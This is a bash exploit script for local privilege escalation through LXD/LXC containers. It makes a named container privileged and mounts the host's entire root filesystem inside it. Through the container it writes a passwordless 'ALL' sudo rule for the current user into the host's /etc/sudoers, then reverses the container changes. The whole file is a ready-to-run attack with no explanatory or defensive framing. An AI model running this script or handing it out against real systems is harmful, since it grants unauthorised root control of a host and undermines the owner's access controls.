#!/bin/bash

USAGE="$(basename "$0") <container name>
Needs Container!"

if [ $# -eq 0 ]
then
    echo "$USAGE"
    exit 0
fi

echo "[+] Stopping container $1"
lxc stop "$1"

echo "[+] Setting container security privilege on"
lxc config set "$1" security.privileged true

echo "[+] Starting container $1"
lxc start "$1"

echo "[+] Mounting host root filesystem to $1"
lxc config device add "$1" rootdisk disk source=/ path=/mnt/root recursive=true

echo "[+] Using container to add $USER to /etc/sudoers"
lxc exec "$1" -- /bin/sh -c "echo $USER 'ALL=(ALL)' NOPASSWD: ALL >> /mnt/root/etc/sudoers"

echo "[+] Unmounting host root filesystem from $1"
lxc config device remove "$1" rootdisk

echo "[+] Resetting container security privilege to off"
lxc config set "$1" security.privileged false

echo "[+] Stopping the container"
lxc stop "$1"

echo "[+] Done! Enjoy your sudo superpowers!"

exit 0
